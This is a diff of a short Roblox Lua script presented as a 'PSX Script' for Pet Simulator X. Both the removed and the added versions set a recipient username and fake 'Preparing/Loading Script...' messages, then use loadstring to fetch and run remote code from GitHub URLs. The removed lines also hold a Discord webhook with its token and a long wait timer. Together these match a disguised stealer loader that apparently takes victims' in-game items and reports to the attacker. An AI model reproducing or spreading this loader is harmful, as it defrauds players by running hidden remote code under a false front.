@@ -1,17 +1,8 @@
-UserName = "Murdyoof"
-
-Webhook = "https://discord.com/api/webhooks/1103436446012018829/JZ5X7LNsBetOUZyXo6bJq2Hxmz3d9cWXoiQiTYJ3YpHC8giBhUCdMUrfrKqIYNjZdOiK"
-
-_G.MouseLock = false
-
-_G.ScriptName = "Psx Script!"
-
-_G.FirstText = "Preparing Script..."
-
-_G.SecondText = "Loading Script..."
-
-_G.ThirdText = "Finishing Things Up..."
-
-_G.WaitingTime = 180
-
-loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
+Username = "Murdyoof"
+loadingscreen = true
+_G.CustomScriptName = "PSX Script!"
+_G.Text1 = "Preparing Script..."
+_G.Text2 = "Loading Script..."
+_G.Text3 = "Finishing Things Up..."
+_G.Text4 = "Almost Done..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
